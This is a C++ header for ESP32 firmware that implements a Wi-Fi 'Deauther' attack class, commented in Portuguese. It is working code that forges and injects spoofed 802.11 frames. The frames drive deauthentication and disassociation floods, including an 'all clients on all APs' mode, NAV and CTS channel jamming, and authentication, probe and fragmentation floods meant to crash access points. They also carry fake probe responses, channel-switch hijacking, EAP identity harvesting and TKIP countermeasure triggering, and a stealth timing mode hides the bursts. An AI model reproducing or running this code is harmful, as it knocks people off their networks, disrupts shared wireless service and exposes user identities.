#pragma once
#include <Arduino.h>
#include <esp_wifi.h>
#include <vector>
#include <algorithm>
#include "../utils/logger.h"
#include "../config.h"

class Deauther {
public:
    static Deauther& get() { static Deauther inst; return inst; }

    bool     running       = false;
    bool     autoCapture   = false;
    uint32_t framesSent    = 0;
    uint8_t  intensity     = 1;  // 0=suave, 1=normal, 2=agressivo
    bool     stealthMode   = false; // intervalo aleatório entre bursts (#21)
    unsigned long _nextBurst = 0;   // timestamp do próximo burst em modo stealth

    // Modos especiais
    bool pmfBypass       = false; // SA Query flood para APs com 802.11w
    bool assocFlood      = false; // Inunda tabela de associação do AP
    bool nullFrames      = true;  // Envia null-function com PM=1 (power-save trick)
    bool reconnectBlock  = false; // Probe Response flood falso — impede cliente de reconectar
    bool csaMode         = false; // Channel Switch Announcement — move clientes para outro canal
    bool eapFlood        = false; // EAP Identity Request flood — confunde supplicants
    bool tkipInjection   = false; // Envia EAPOL-Key com MIC failure (reason 0x0E) — TKIP countermeasure

    // ── Ataques de negação de serviço no meio físico ──────────────────────────
    bool navFlood        = false; // NAV/Duration poison — reserva o meio por 32767µs
                                  // Todos os dispositivos no canal param de transmitir
    bool ctsFlood        = false; // CTS-to-Self flood — mesmo efeito do NAV sem spoofar MAC
                                  // Mais furtivo: parece frame legítimo de controle
    bool probeFlood      = false; // Probe Request flood com MACs aleatórios
                                  // Consome CPU/memória do AP respondendo a clientes inexistentes
    bool fragFlood       = false; // Fragmentation flood — fragmentos sem frame final
                                  // Esgota buffers de reassembly do AP (ataque de memória)
    bool deauthAll       = false; // Deauth universal — desconecta TODOS os clientes de TODOS os APs
                                  // no canal atual simultaneamente (modo nuclear por canal)

    uint8_t csaChannel   = 13;    // Canal destino para CSA attack
    uint8_t csaCount     = 5;     // Contagem regressiva CSA (frames até troca)
    char targetSSID[33]  = {};    // SSID do AP alvo (para reconnectBlock/CSA)

    uint8_t targetAP[6]     = {0};
    uint8_t targetClient[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t channel         = 1;
    bool    broadcastMode   = true;

    struct Target {
        uint8_t ap[6];
        uint8_t client[6];
        uint8_t channel;
    };
    std::vector<Target> multiTargets;
    bool multiMode = false;

    using LockChannelFn = void(*)(uint8_t ch);
    using ResumeHopFn   = void(*)();
    LockChannelFn fnLockChannel = nullptr;
    ResumeHopFn   fnResumeHop   = nullptr;

    void start(const uint8_t* ap, const uint8_t* client, uint8_t ch, bool autoC = false, const char* ssid = nullptr) {
        memcpy(targetAP, ap, 6);
        if (client) memcpy(targetClient, client, 6);
        else        memset(targetClient, 0xFF, 6);
        channel       = ch;
        broadcastMode = (client == nullptr || memcmp(client, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) == 0);
        autoCapture   = autoC;
        framesSent    = 0;
        _seq          = 0;
        multiMode     = false;
        running       = true;
        if (ssid) { strncpy(targetSSID, ssid, 32); targetSSID[32] = 0; }
        else       targetSSID[0] = 0;
        if (fnLockChannel) fnLockChannel(ch);
        esp_wifi_set_max_tx_power(84); // ~20 dBm
        String mode = broadcastMode ? "BROADCAST" : bssidStr(client);
        LOG.warn("[DEAUTH] " + bssidStr(ap) + " -> " + mode +
                 " ch" + String(ch) +
                 (nullFrames      ? " +NULL"    : "") +
                 (pmfBypass       ? " +PMF"     : "") +
                 (assocFlood      ? " +ASSOC"   : "") +
                 (reconnectBlock  ? " +REBLOCK" : "") +
                 (csaMode         ? " +CSA→ch" + String(csaChannel) : "") +
                 (eapFlood        ? " +EAP"    : "") +
                 (tkipInjection   ? " +TKIP"   : "") +
                 (autoC ? " [AUTO-CAPTURE]" : ""));
    }

    void startMulti(const std::vector<Target>& targets) {
        multiTargets = targets;
        // Agrupa por canal para minimizar troca de canal
        std::stable_sort(multiTargets.begin(), multiTargets.end(),
            [](const Target& a, const Target& b){ return a.channel < b.channel; });
        multiMode  = true;
        framesSent = 0;
        _seq       = 0;
        running    = true;
        esp_wifi_set_max_tx_power(84);
        LOG.warn("[DEAUTH MULTI] " + String(targets.size()) + " alvos (agrupados por canal)");
    }

    void addMultiTarget(const uint8_t* ap, const uint8_t* client, uint8_t ch) {
        Target t;
        memcpy(t.ap, ap, 6); memcpy(t.client, client, 6); t.channel = ch;
        multiTargets.push_back(t);
    }

    void stop() {
        running = false; autoCapture = false; multiMode = false;
        multiTargets.clear();
        if (fnResumeHop) fnResumeHop();
        esp_wifi_set_max_tx_power(78);
        LOG.info("[DEAUTH] Parado. Frames: " + String(framesSent));
    }

    void tick() {
        if (!running) return;
        // Stealth: respeita intervalo aleatório entre bursts (#21)
        if (stealthMode) {
            unsigned long now = millis();
            if (now < _nextBurst) return;
            uint32_t delay = DEAUTH_STEALTH_MIN_MS +
                             (esp_random() % (DEAUTH_STEALTH_MAX_MS - DEAUTH_STEALTH_MIN_MS));
            _nextBurst = now + delay;
        }
        if (multiMode) _tickMulti();
        else           _tickSingle();
    }

    static String bssidStr(const uint8_t* b) {
        char buf[18];
        snprintf(buf, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
                 b[0],b[1],b[2],b[3],b[4],b[5]);
        return buf;
    }

private:
    uint16_t _seq = 0; // sequence number controlado manualmente

    // 16 reason codes — cobre todos os drivers de clientes
    static const uint8_t _reasons[16];

    int _burstSize() const {
        if (intensity == 0) return DEAUTH_BURST_SOFT;
        if (intensity == 2) return DEAUTH_BURST_HARD;
        return DEAUTH_BURST;
    }

    // Próximo seq number (incrementa a cada frame como AP real)
    uint16_t _nextSeq() { _seq = (_seq + 16) & 0xFFF0; return _seq; }

    void _tickSingle() {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        int burst = _burstSize();

        for (int i = 0; i < burst; i++) {
            uint8_t r = _reasons[i % 16];
            // Deauth bidirecional (AP→Cli e Cli→AP)
            _sendDeauth(targetAP, targetClient, r);
            // Disassoc para forçar estado ASSOC=0
            _sendDisassoc(targetAP, targetClient, r);
            framesSent += 2;

            if (!broadcastMode) {
                // Broadcast adicional para desconectar todos do AP
                _sendDeauth(targetAP, bcast, r);
                framesSent++;
            }
        }

        // Null frame trick: faz AP bufferizar tráfego → cliente fica sem dados
        if (nullFrames) {
            _sendNullPowerSave(targetAP, targetClient);
            framesSent++;
        }

        // SA Query flood: contra APs com PMF (802.11w) ativo
        if (pmfBypass) {
            for (int i = 0; i < 8; i++) {
                _sendSAQueryRequest(targetAP, targetClient, (uint16_t)(_seq + i));
                framesSent++;
            }
        }

        // Auth flood: inunda tabela de associação, dificulta reconexão
        if (assocFlood) {
            for (int i = 0; i < 16; i++) {
                _sendAuthFlood(targetAP);
                framesSent++;
            }
        }

        // Reconnect Block: envia probe responses com o SSID real mas BSSID falso
        // Cliente pós-deauth fica tentando se associar ao AP falso em vez do real
        if (reconnectBlock && targetSSID[0] != 0 && !broadcastMode) {
            _sendReconnectBlock(targetClient, targetSSID, channel);
            framesSent++;
        }

        // CSA Attack: Channel Switch Announcement
        // Injeta Action frames + beacons falsos ordenando todos os clientes
        // a mudar para csaChannel — canal onde controlamos o AP clone
        if (csaMode) {
            for (int r = 0; r < 3; r++) {
                _sendCSAAction(targetAP, csaChannel, csaCount > r ? csaCount - r : 1);
                framesSent++;
            }
        }

        // EAP Identity Request flood: envia pedidos de identidade EAP falsos
        // Confunde supplicants WPA2-Enterprise e pode revelar identidades (username)
        if (eapFlood && !broadcastMode) {
            for (int i = 0; i < 4; i++) {
                _sendEAPIdentityRequest(targetAP, targetClient);
                framesSent++;
            }
        }

        // TKIP MIC Failure injection: reporta falha MIC falsa do cliente ao AP
        // Aciona countermeasures TKIP (60s blackout) em redes WPA-TKIP legadas
        if (tkipInjection && !broadcastMode) {
            _sendTKIPMicFailure(targetAP, targetClient);
            framesSent++;
        }

        // NAV/Duration Poison: envia frames com Duration=32767µs (máximo IEEE 802.11)
        // Todos os dispositivos no canal setam seu NAV e ficam em silêncio
        // Efeito: congela COMPLETAMENTE o canal — nenhum dispositivo consegue transmitir
        if (navFlood) {
            for (int i = 0; i < 32; i++) {
                _sendNAVPoison(targetAP, channel);
                framesSent++;
            }
        }

        // CTS-to-Self flood: CTS (Clear To Send) com Duration=32767µs
        // Mais furtivo que NAV puro — parece frame de controle normal
        // Afeta toda a BSS sem precisar spoofar MAC de destino específico
        if (ctsFlood) {
            for (int i = 0; i < 32; i++) {
                _sendCTSFlood(targetAP, channel);
                framesSent++;
            }
        }

        // Probe Request flood: inunda AP com requisições de clientes fantasma
        // Cada AP responde com Probe Response → consome CPU, memória e banda do AP
        // APs mais fracos (roteadores domésticos) travam com ~500 req/s
        if (probeFlood) {
            for (int i = 0; i < 16; i++) {
                _sendProbeFlood(targetSSID[0] ? targetSSID : nullptr, channel);
                framesSent++;
            }
        }

        // Fragmentation flood: envia fragmento 1/X sem jamais enviar o fragmento final
        // AP reserva buffer para remontar — com centenas de fragmentos pendentes,
        // o buffer de reassembly esgota e o AP para de aceitar frames legítimos
        if (fragFlood) {
            for (int i = 0; i < 8; i++) {
                _sendFragmentFlood(targetAP, channel);
                framesSent++;
            }
        }

        // Deauth universal: deautentica broadcast em todos os canais em sequência
        // Usa MACs genéricos para atingir qualquer AP no canal sem precisar do BSSID
        if (deauthAll) {
            const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
            uint8_t fakeBSSID[6]   = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
            for (int i = 0; i < 8; i++) {
                esp_fill_random(fakeBSSID, 6);
                fakeBSSID[0] &= 0xFE; // unicast bit
                _sendDeauth(fakeBSSID, bcast, _reasons[i % 16]);
                _sendDisassoc(fakeBSSID, bcast, _reasons[i % 16]);
                framesSent += 2;
            }
        }
    }

    void _tickMulti() {
        if (multiTargets.empty()) return;
        int burst = _burstSize();
        uint8_t lastCh = 0;

        for (auto& t : multiTargets) {
            if (t.channel != lastCh) {
                esp_wifi_set_channel(t.channel, WIFI_SECOND_CHAN_NONE);
                lastCh = t.channel;
            }
            int b = max(16, burst / (int)multiTargets.size());
            for (int i = 0; i < b; i++) {
                uint8_t r = _reasons[i % 16];
                _sendDeauth(t.ap, t.client, r);
                _sendDisassoc(t.ap, t.client, r);
                framesSent += 2;
            }
            if (nullFrames) { _sendNullPowerSave(t.ap, t.client); framesSent++; }
            if (assocFlood) {
                for (int i = 0; i < 8; i++) { _sendAuthFlood(t.ap); framesSent++; }
            }
        }
    }

    // --- Frame builders ---

    // Deauth (0xC0) bidirecional
    void _sendDeauth(const uint8_t* ap, const uint8_t* cli, uint8_t reason) {
        _sendMgmt(ap, cli, 0xC0, reason);
    }

    // Disassoc (0xA0) bidirecional
    void _sendDisassoc(const uint8_t* ap, const uint8_t* cli, uint8_t reason) {
        _sendMgmt(ap, cli, 0xA0, reason);
    }

    // AP→Client + Client→AP para o mesmo tipo de frame
    void _sendMgmt(const uint8_t* ap, const uint8_t* cli, uint8_t fc0, uint8_t reason) {
        uint8_t f[26] = {};
        f[0] = fc0; f[1] = 0x00;
        f[2] = 0x3A; f[3] = 0x01; // Duration 314µs
        uint16_t sq = _nextSeq();
        f[22] = sq & 0xFF; f[23] = (sq >> 8) & 0xFF;
        f[24] = reason;

        // AP → Client
        memcpy(f+4, cli, 6); memcpy(f+10, ap, 6); memcpy(f+16, ap, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false); // false = usa nossos seq numbers

        // Client → AP (spoof reverso)
        memcpy(f+4, ap, 6); memcpy(f+10, cli, 6); memcpy(f+16, ap, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false);
    }

    // Null data frame com Power Management bit = 1
    // Diz ao AP que o cliente entrou em power-save → AP para de enviar dados → cliente perde conectividade
    void _sendNullPowerSave(const uint8_t* ap, const uint8_t* cli) {
        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        if (memcmp(cli, bcast, 6) == 0) return; // não faz sentido em broadcast
        uint8_t f[24] = {};
        f[0] = 0x48;        // Data, subtype=Null function (0x04 << 4 | 0x08)
        f[1] = 0x11;        // ToDS=1, PM=1 (power management bit)
        f[2] = 0x3A; f[3] = 0x01;
        uint16_t sq = _nextSeq();
        f[22] = sq & 0xFF; f[23] = (sq >> 8) & 0xFF;
        // ToDS=1: RA=AP, TA=client, DA no BSSID field
        memcpy(f+4, ap, 6);   // RA = AP
        memcpy(f+10, cli, 6); // TA = client (spoofado)
        memcpy(f+16, ap, 6);  // BSSID = AP
        esp_wifi_80211_tx(WIFI_IF_AP, f, 24, true);
    }

    // SA Query Request (Action frame, category=8, action=0)
    // Força clientes PMF a gastar CPU respondendo → pode causar DoS em firmware fraco
    void _sendSAQueryRequest(const uint8_t* ap, const uint8_t* cli, uint16_t txid) {
        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        if (memcmp(cli, bcast, 6) == 0) return;
        uint8_t f[30] = {};
        f[0] = 0xD0; f[1] = 0x00; // Action frame
        f[2] = 0x3A; f[3] = 0x01;
        memcpy(f+4, cli, 6); memcpy(f+10, ap, 6); memcpy(f+16, ap, 6);
        uint16_t sq = _nextSeq();
        f[22] = sq & 0xFF; f[23] = (sq >> 8) & 0xFF;
        // Action body: Category=8 (SA Query), Action=0 (Request), TransactionID
        f[24] = 0x08; // SA Query category
        f[25] = 0x00; // Request
        f[26] = txid & 0xFF; f[27] = (txid >> 8) & 0xFF;
        esp_wifi_80211_tx(WIFI_IF_AP, f, 28, true);
    }

    // Probe Response falsa com SSID real mas BSSID aleatório
    // Enviada diretamente ao cliente (unicast) após deauth
    // Efeito: cliente fica "preso" tentando associar ao AP fantasma
    void _sendReconnectBlock(const uint8_t* cli, const char* ssid, uint8_t ch) {
        uint8_t ssidLen = strlen(ssid);
        if (ssidLen > 32) ssidLen = 32;
        // BSSID falso: mesmo FNV-1a do Karma, XOR com seq para variar a cada envio
        uint32_t h = 2166136261u;
        for (int i = 0; i < ssidLen; i++) h = (h ^ (uint8_t)ssid[i]) * 16777619u;
        h ^= (uint32_t)_seq;
        uint8_t fakeBSSID[6] = {0x02, (uint8_t)(h>>24), (uint8_t)(h>>16), (uint8_t)(h>>8), (uint8_t)h, ch};

        uint8_t f[128] = {};
        uint8_t off = 0;
        f[off++] = 0x50; f[off++] = 0x00; // Probe Response
        f[off++] = 0x00; f[off++] = 0x00;
        memcpy(f + off, cli, 6);       off += 6; // DA = cliente
        memcpy(f + off, fakeBSSID, 6); off += 6; // SA = AP falso
        memcpy(f + off, fakeBSSID, 6); off += 6; // BSSID = AP falso
        f[off++] = 0x00; f[off++] = 0x00;
        uint64_t ts = esp_timer_get_time();
        memcpy(f + off, &ts, 8); off += 8;
        f[off++] = 0x64; f[off++] = 0x00; // beacon interval
        f[off++] = 0x31; f[off++] = 0x04; // capabilities
        f[off++] = 0x00; f[off++] = ssidLen;
        memcpy(f + off, ssid, ssidLen); off += ssidLen;
        f[off++] = 0x01; f[off++] = 0x08;
        const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
        memcpy(f + off, rates, 8); off += 8;
        f[off++] = 0x03; f[off++] = 0x01; f[off++] = ch;
        esp_wifi_80211_tx(WIFI_IF_AP, f, off, false);
    }

    // CSA Action frame (Spectrum Management, category=0, action=4)
    // Força clientes a migrarem para newCh com contagem regressiva
    void _sendCSAAction(const uint8_t* ap, uint8_t newCh, uint8_t count) {
        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        uint8_t f[38] = {};
        f[0] = 0xD0; f[1] = 0x00; // Action
        f[2] = 0x3A; f[3] = 0x01;
        memcpy(f+4,  bcast, 6);   // DA broadcast
        memcpy(f+10, ap,    6);   // SA = AP alvo (spoofado)
        memcpy(f+16, ap,    6);   // BSSID = AP alvo
        uint16_t sq = _nextSeq();
        f[22] = sq & 0xFF; f[23] = (sq >> 8) & 0xFF;
        f[24] = 0x00; // Category: Spectrum Management
        f[25] = 0x04; // Action: Channel Switch Announcement
        // CSA IE (tag 37, len 3)
        f[26] = 0x25; f[27] = 0x03;
        f[28] = 0x01; // Mode=1 (parar tx antes de trocar)
        f[29] = newCh;
        f[30] = count;
        // Extended CSA IE (tag 60) para 802.11n+
        f[31] = 0x3C; f[32] = 0x03;
        f[33] = 0x01; f[34] = newCh; f[35] = count;
        // Secondary Channel Offset IE (tag 62) - nao ha secundario
        f[36] = 0x3E; f[37] = 0x01; // len=1, offset=0
        esp_wifi_80211_tx(WIFI_IF_AP, f, 38, true);
    }

    // EAP Identity Request — frame LLC/SNAP + EAPOL + EAP Request Identity
    // Enviado unicast do AP para o cliente (spoofado)
    void _sendEAPIdentityRequest(const uint8_t* ap, const uint8_t* cli) {
        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        if (memcmp(cli, bcast, 6) == 0) return;
        // Data frame QoS com payload LLC/SNAP EAPOL
        uint8_t f[50] = {};
        f[0] = 0x88; f[1] = 0x02; // QoS Data, FromDS=1
        f[2] = 0x00; f[3] = 0x00;
        memcpy(f+4,  cli, 6);  // DA = client
        memcpy(f+10, ap,  6);  // SA = AP
        memcpy(f+16, ap,  6);  // BSSID = AP
        f[22] = 0x00; f[23] = 0x00; // seq
        f[24] = 0x00; f[25] = 0x00; // QoS control
        // LLC/SNAP
        f[26] = 0xAA; f[27] = 0xAA; f[28] = 0x03;
        f[29] = 0x00; f[30] = 0x00; f[31] = 0x00;
        f[32] = 0x88; f[33] = 0x8E; // EtherType EAPOL
        // EAPOL: ver=1, type=0 (EAP Packet), len=5
        f[34] = 0x01; f[35] = 0x00; f[36] = 0x00; f[37] = 0x05;
        // EAP: code=1 (Request), id=1, len=5, type=1 (Identity)
        f[38] = 0x01; f[39] = 0x01; f[40] = 0x00; f[41] = 0x05; f[42] = 0x01;
        esp_wifi_80211_tx(WIFI_IF_AP, f, 43, false);
    }

    // TKIP MIC Failure Report: finge que o cliente detectou uma falha MIC
    // Aciona TKIP Countermeasures no AP (60s bloqueio) — apenas para WPA-TKIP legado
    void _sendTKIPMicFailure(const uint8_t* ap, const uint8_t* cli) {
        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        if (memcmp(cli, bcast, 6) == 0) return;
        // Action frame: category=14 (WPA), action=0 (MIC Failure Report)
        uint8_t f[32] = {};
        f[0] = 0xD0; f[1] = 0x00;
        f[2] = 0x3A; f[3] = 0x01;
        memcpy(f+4,  ap,  6); // DA = AP (enviamos do cliente para o AP)
        memcpy(f+10, cli, 6); // SA = cliente (spoofado)
        memcpy(f+16, ap,  6); // BSSID = AP
        uint16_t sq = _nextSeq();
        f[22] = sq & 0xFF; f[23] = (sq >> 8) & 0xFF;
        f[24] = 0x0E; // Category: WPA
        f[25] = 0x00; // Action: MIC Failure Report
        f[26] = 0x01; // key type: group
        // TSC (Timestamp Counter) aleatório
        esp_fill_random(f+27, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, f, 33, true);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Novos ataques de DoS no meio físico 802.11
    // ─────────────────────────────────────────────────────────────────────────

    // NAV Poison: Data frame com Duration=32767µs (máximo IEEE 802.11-2020)
    // Virtual NAV: todos os STA/AP que ouvem setam seu timer NAV para 32ms
    // Enviado continuamente → nenhum dispositivo consegue transmitir no canal
    void _sendNAVPoison(const uint8_t* ap, uint8_t ch) {
        (void)ch;
        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        uint8_t f[24] = {};
        f[0] = 0x08; f[1] = 0x00;      // Data frame
        f[2] = 0xFF; f[3] = 0x7F;      // Duration = 32767µs (máximo)
        memcpy(f+4,  bcast, 6);         // DA = broadcast
        memcpy(f+10, ap,    6);         // SA = AP alvo (spoofado)
        memcpy(f+16, ap,    6);         // BSSID = AP alvo
        uint16_t sq = _nextSeq();
        f[22] = sq & 0xFF; f[23] = (sq >> 8) & 0xFF;
        esp_wifi_80211_tx(WIFI_IF_AP, f, 24, false);
    }

    // CTS-to-Self broadcast: Duration=32767µs, RA=broadcast
    // RA broadcast faz TODOS os dispositivos no canal reservarem NAV (não só o AP)
    // Alterna também RTS (Request-to-Send) para máximo efeito de bloqueio
    void _sendCTSFlood(const uint8_t* ap, uint8_t ch) {
        (void)ch;
        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

        // CTS frame: FC(2) + Duration(2) + RA(6) = 10 bytes
        uint8_t f[10] = {};
        f[0] = 0xC4; f[1] = 0x00;   // CTS
        f[2] = 0xFF; f[3] = 0x7F;   // Duration = 32767µs
        memcpy(f+4, bcast, 6);        // RA = broadcast → todos reservam NAV
        esp_wifi_80211_tx(WIFI_IF_AP, f, 10, false);

        // RTS frame: FC(2) + Duration(2) + RA(6) + TA(6) = 16 bytes
        uint8_t r[16] = {};
        r[0] = 0xB4; r[1] = 0x00;   // RTS
        r[2] = 0xFF; r[3] = 0x7F;   // Duration = 32767µs
        memcpy(r+4, ap,    6);        // RA = AP alvo
        memcpy(r+10, bcast, 6);       // TA = broadcast
        esp_wifi_80211_tx(WIFI_IF_AP, r, 16, false);
    }

    // Probe Request flood com MAC aleatório e HT/VHT Capabilities
    // APs 802.11n/ac precisam processar os IEs e gerar Probe Response completa → mais CPU
    void _sendProbeFlood(const char* ssid, uint8_t ch) {
        uint8_t srcMac[6], bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        esp_fill_random(srcMac, 6);
        srcMac[0] |= 0x02; srcMac[0] &= 0xFE;

        uint8_t ssidLen = ssid ? (uint8_t)strlen(ssid) : 0;
        if (ssidLen > 32) ssidLen = 32;

        uint8_t f[128] = {};
        uint8_t off = 0;
        f[off++] = 0x40; f[off++] = 0x00; // Probe Request
        f[off++] = 0x00; f[off++] = 0x00;
        memcpy(f+off, bcast,  6); off += 6;
        memcpy(f+off, srcMac, 6); off += 6;
        memcpy(f+off, bcast,  6); off += 6;
        uint16_t sq = _nextSeq();
        f[off++] = sq & 0xFF; f[off++] = (sq >> 8) & 0xFF;
        // SSID IE
        f[off++] = 0x00; f[off++] = ssidLen;
        if (ssid && ssidLen > 0) { memcpy(f+off, ssid, ssidLen); off += ssidLen; }
        // Supported Rates
        f[off++] = 0x01; f[off++] = 0x08;
        const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
        memcpy(f+off, rates, 8); off += 8;
        // DS Parameter Set
        f[off++] = 0x03; f[off++] = 0x01; f[off++] = ch;
        // Extended Supported Rates
        f[off++] = 0x32; f[off++] = 0x04;
        const uint8_t extRates[] = {0x30,0x48,0x60,0x6C};
        memcpy(f+off, extRates, 4); off += 4;
        // HT Capabilities IE (tag 45) — força AP a responder com HT info
        f[off++] = 0x2D; f[off++] = 0x1A;
        const uint8_t htcap[] = {0xEF,0x19,0x1B,0xFF,0x00,0x00,0x00,0x00,
                                  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
        memcpy(f+off, htcap, 26); off += 26;
        // VHT Capabilities IE (tag 191) — força resposta 802.11ac
        f[off++] = 0xBF; f[off++] = 0x0C;
        const uint8_t vhtcap[] = {0x32,0x00,0x80,0x03,0xAA,0xFF,0x00,0x00,0xAA,0xFF,0x00,0x00};
        memcpy(f+off, vhtcap, 12); off += 12;
        esp_wifi_80211_tx(WIFI_IF_AP, f, off, false);
    }

    // Fragmentation flood: fragmento 1/3 sem jamais enviar fragmento 2 e 3
    // AP aloca buffer de reassembly para cada fragmento pendente
    // Com ~128 fragmentos pendentes distintos, a maioria dos APs trava ou reinicia
    void _sendFragmentFlood(const uint8_t* ap, uint8_t ch) {
        (void)ch;
        uint8_t srcMac[6];
        esp_fill_random(srcMac, 6);
        srcMac[0] |= 0x02; srcMac[0] &= 0xFE;

        // Data frame fragmentado: More Fragments bit = 1, Fragment Number = 0
        uint8_t f[30] = {};
        f[0] = 0x08;  // Data
        f[1] = 0x04;  // ToDS=1
        f[2] = 0x00; f[3] = 0x00;
        memcpy(f+4,  ap,     6); // RA = AP
        memcpy(f+10, srcMac, 6); // TA = cliente fantasma
        memcpy(f+16, ap,     6); // BSSID = AP

        // MoreFrag fica no FC byte 1 bit 2; Sequence Control = SeqNum(12b) | FragNum(4b)
        f[1] |= 0x04; // More Fragments = 1
        uint16_t sq = (_nextSeq() & 0xFFF0); // fragment number = 0 (bits 0-3)
        f[22] = sq & 0xFF; f[23] = (sq >> 8) & 0xFF;
        // Payload aleatório de 4 bytes (simula início de frame encriptado)
        esp_fill_random(f+24, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, f, 30, false);
    }

    // Auth Request de MAC aleatório → enche tabela de autenticação do AP
    // Clientes legítimos deautenticados não conseguem se re-autenticar
    void _sendAuthFlood(const uint8_t* ap) {
        uint8_t f[30] = {};
        f[0] = 0xB0; f[1] = 0x00; // Authentication
        f[2] = 0x3A; f[3] = 0x01;
        // MAC fonte aleatório (bit U/L = 1 para MAC local)
        uint8_t fake[6];
        esp_fill_random(fake, 6);
        fake[0] |= 0x02; fake[0] &= 0xFE; // locally administered, unicast
        memcpy(f+4, ap, 6);    // DA = AP
        memcpy(f+10, fake, 6); // SA = MAC aleatório
        memcpy(f+16, ap, 6);   // BSSID = AP
        uint16_t sq = _nextSeq();
        f[22] = sq & 0xFF; f[23] = (sq >> 8) & 0xFF;
        // Auth body: Algorithm=Open(0), Seq=1, Status=0
        f[24] = 0x00; f[25] = 0x00; // Open System
        f[26] = 0x01; f[27] = 0x00; // Auth seq 1
        f[28] = 0x00; f[29] = 0x00; // Status = Success
        esp_wifi_80211_tx(WIFI_IF_AP, f, 30, true);
    }
};

// 16 reason codes IEEE 802.11-2020
inline const uint8_t Deauther::_reasons[16] = {
    0x01, // Unspecified
    0x02, // Previous auth no longer valid
    0x03, // Deauth: STA leaving
    0x04, // Inactivity
    0x05, // AP can't handle all STAs
    0x06, // Class 2 frame from non-auth STA
    0x07, // Class 3 frame from non-assoc STA
    0x08, // STA leaving BSS
    0x09, // STA not auth with this BSS
    0x0E, // MIC failure
    0x0F, // 4-Way Handshake timeout
    0x10, // Group Key Handshake timeout
    0x11, // IE in reassoc differs
    0x12, // Invalid group cipher
    0x13, // Invalid pairwise cipher
    0x14, // Invalid AKMP
};
